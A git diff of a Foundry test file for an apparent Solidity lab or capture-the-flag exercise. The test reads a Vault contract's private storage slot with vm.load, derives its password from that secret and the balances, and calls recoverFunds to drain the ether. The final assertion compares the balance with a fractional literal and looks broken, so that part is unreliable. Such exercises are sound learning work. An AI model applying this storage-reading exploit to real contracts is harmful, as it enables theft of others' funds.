@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.11;
 
-
+import "lib/forge-std/src/console.sol";
 import "lib/forge-std/src/Test.sol";
 import "../src/Vault.sol";
 
@@ -11,22 +11,32 @@ contract VaultTest is Test {
 
     function setUp() public {
         vault = new Vault{value: 0.0001 ether}();
-        Juan = makeAddr("Juan");
-        
+        Juan = makeAddr("Juan"); 
     }
 
     function testVault() public{
         vm.startPrank(Juan);
         vm.deal(Juan, 0.0001 ether);
-
-        (bool sent, ) = payable(address(vault)).call{value:0.0001 ether}("");
-        if (!sent){
-
-            //revert HaFallado();
-        }
+        bytes32 secretValue;
+        uint256 password;
+        console.log("BalanceJuan", Juan.balance);
+        
+        secretValue = vm.load(address(vault), bytes32(uint256(0)));
+        console.logBytes32(secretValue);
 
         console.log("Balance Vault: ",address(vault).balance);
-        //console.log("Secreto: ",address(vault)._secret);
+       
+        password = uint256(keccak256(abi.encodePacked(secretValue,address(vault).balance+Juan.balance)));
+        //require(sent, "Ha fallado el Call");
+        console.log("Password",password);
+
+        (bool sent, ) = payable(address(vault)).call{value:Juan.balance}(abi.encodeWithSignature("recoverFunds(uint256)", password));
+        console.log("Balance Vault: ",address(vault).balance);
+        
+        assertEq(Juan.balance, 0.0002);
+        console.log("BalanceJuan", Juan.balance);
+
+
 
         //Web3.eth.getStorageAt(address, slotNumber = 0, 1, 2, etc., console.log)
      
@@ -51,8 +61,8 @@ contract VaultTest is Test {
         }
 }*/
     }
-}
 
+}
 /*
 
 
